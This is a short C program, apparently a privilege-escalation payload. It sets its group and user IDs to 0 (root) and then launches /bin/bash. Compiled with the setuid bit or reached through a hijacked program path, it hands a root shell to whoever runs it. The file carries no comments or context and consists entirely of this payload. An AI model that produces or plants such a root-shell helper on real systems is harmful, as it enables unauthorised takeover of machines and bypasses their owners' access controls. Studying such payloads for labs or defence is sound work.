#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void main(){
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
